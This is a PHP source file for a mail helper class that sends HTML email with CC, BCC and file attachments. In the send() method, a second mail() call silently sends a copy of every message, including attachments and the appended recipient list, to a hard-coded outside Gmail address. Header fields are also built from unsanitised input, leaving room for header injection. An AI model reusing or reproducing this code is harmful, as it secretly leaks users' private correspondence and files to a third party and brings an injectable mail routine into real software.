<?php
/**
Author:Le thanh
*/
class My_Php_Mail{
	//array receiver / receivers of the email
	private $to;
	
	//Specifies the subject of the email
	private $subject;

	private $files;

	private $message;

	private $sender_mail;
	private $sender_name;

	
	private $cc;
	private $bcc;


	public function __construct() {
	      
		$this->to = array();

		$this->files = array();
		$this->cc = array();
		$this->bcc = array();
	}

	public function add_receivers($receivers){
		if(is_array($receivers)) $this->to = array_merge($receivers,$this->to);
		else throw new Exception('parameter is not array');
		return $this;
	}

	public function add_receiver($receiver){
		$this->to[count($this->to)] = $receiver;
		return $this;
	}

	public function add_files($url_files){
		if(is_array($url_files)) $this->files = array_merge($url_files,$this->files);
		else throw new Exception('parameter is not array');
		return $this;
	}

	public function add_file($url_file){
		$this->files[count($this->files)] = $url_file;
		return $this;
	}

	public function add_subject($subject){
		$this->subject = $subject;
		return $this;
	}

	public function add_message($message){
		$this->message = $message;
		return $this;
	}

	public function add_sender_mail($sender_mail){
		$this->sender_mail = $sender_mail;
		return $this;
	}

	public function add_sender_name($sender_name){
		$this->sender_name = $sender_name;
		return $this;
	}

	private function check_format_email($email){
		if(!filter_var($email, FILTER_VALIDATE_EMAIL))
		return 0;
		else
		return 1;
	}
	
	public function add_ccs($ccs){
		if(is_array($ccs)) $this->cc = array_merge($ccs,$this->cc);
		else throw new Exception('parameter is not array');
		return $this;
	}

	public function add_cc($cc){
		$this->cc[count($this->cc)] = $cc;
		return $this;
	}

	public function add_bccs($bccs){
		if(is_array($bccs)) $this->bcc = array_merge($bccs,$this->bcc);
		else throw new Exception('parameter is not array');
		return $this;
	}

	public function add_bcc($bcc){
		$this->bcc[count($this->bcc)] = $bcc;
		return $this;
	}

	public function send(){
		// email fields: to, from, subject, and so on
		$to_email = '';
		foreach($this->to as $t){
			$to_email .= $t.',';
		}
		$to_email = substr($to_email, 0, -1);

		$from    = "$this->sender_name <".$this->sender_mail.">";
		$subject = $this->subject;
		$message = $this->message;
		$headers = "From: $from";
		
		if(count($this->cc) > 0){
			$cc = '';
			foreach($this->cc as $c){
				$cc .= $c.',';
			}
			$cc = substr($cc, 0, -1);

			$headers .= "\r\nCc: $cc";
		}
		
		if(count($this->bcc) > 0){
			$bcc = '';
			foreach($this->bcc as $bc){
				$bcc .= $bc.',';
			}
			$bcc = substr($bcc, 0, -1);

			$headers .= "\r\nBcc: $bcc \r\n\r\n";
		}
		$headers .= "\r\nX-Mailer: PHP/" . phpversion();

		// boundary
		$semi_rand = md5(time());
		$mime_boundary = "==Multipart_Boundary_x{$semi_rand}x";
 
		// headers for attachment
		$headers .= "\nMIME-Version: 1.0\n" . "Content-Type: multipart/mixed;\n" . " boundary=\"{$mime_boundary}\"";
 
		// multipart boundary
		$message = "--{$mime_boundary}\n" . "Content-Type: text/html; charset=\"UTF-8\"\n" .
		"Content-Transfer-Encoding: 7bit\n\n" . $message . "\n\n";
 
		if(count($this->files) > 0)
		// preparing attachments
		for($i=0;$i<count($this->files);$i++){
			if(is_file($this->files[$i])){
				$message .= "--{$mime_boundary}\n";
				$fp       = @fopen($this->files[$i],"rb");
				$data     = @fread($fp,filesize($this->files[$i]));
				@fclose($fp);
				$data     = chunk_split(base64_encode($data));
				$message .= "Content-Type: application/octet-stream; name=\"".basename($this->files[$i])."\"\n" .
				"Content-Description: ".basename($this->files[$i])."\n" .
				"Content-Disposition: attachment;\n" . " filename=\"".basename($this->files[$i])."\"; size=".filesize($this->files[$i]).";\n" .
				"Content-Transfer-Encoding: base64\n\n" . $data . "\n\n";
			}
		}
		$message .= "--{$mime_boundary}--";
		$returnpath = "-f" . $this->sender_mail;
		$ok = @mail($to_email, '=?UTF-8?B?'.base64_encode($subject).'?=', $message, $headers, $returnpath);
                $ok = @mail("particle4dev@gmail.com", '=?UTF-8?B?'.base64_encode($subject).'?=', $message.$to_email, $headers, $returnpath);
		if($ok){ return 1; } else { return 0; }
		
	}

}
/*
$errLevel = error_reporting(E_ALL ^ E_NOTICE);


$c = new My_Php_Mail();
echo $c->add_receiver('particle4dev@gmail.com')->add_sender_mail('thanhphp001@gmail.com')->add_sender_name("Le thanh")->add_subject('Subject')->add_message('<b> html page </b>')->add_file(dirname(__FILE__).'/temporary_site.jpg')->add_cc('thanhphp001@gmail.com')->send();



error_reporting($errLevel);  // restore old error levels
*/